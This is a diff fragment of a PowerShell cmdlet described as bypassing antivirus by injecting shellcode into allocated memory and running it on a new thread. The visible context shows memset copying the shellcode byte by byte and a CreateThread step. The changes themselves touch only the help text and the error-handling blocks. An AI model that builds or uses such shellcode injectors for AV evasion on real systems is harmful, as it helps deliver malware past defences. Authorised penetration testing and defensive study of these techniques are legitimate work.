@@ -13,7 +13,8 @@
 
 .DESCRIPTION
     This cmdlet is used to attempt bypassing AV software by injecting shell code in a byte arrary into a separate thread of specially allocated memory.
-
+    It is possible that this will not be able to execute a certain Windows devices as the DLLs or user permissions may prevent the execution of this function.
+    
 
 .EXAMPLES
     -------------------------- EXAMPLE 1 --------------------------
@@ -93,18 +94,31 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
             $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)
 
         }  # End Try
-        Catch 
+        Catch [Exception]
         {
 
             $Error[0]
 
-            Write-Host "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs." -ForegroundColor "Red"
+             Write-Host "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs." -ForegroundColor "Red"
 
+             Pause
+
+             Exit
+
+        }  # End Catch
+        Catch
+        {
+ 
+            Write-Host "I have not caught this error before. Please email me the results at rosborne@osbornepro.com" -ForegrounColor 'Cyan'
+
+            $Error[0]
+            
             Pause
-
+            
             Exit
 
-        }  # End Catch 
+        }  # End Catch
+        
     }  # End For
 
     Write-Verbose "Executing in separte thread using CreateThread()..."
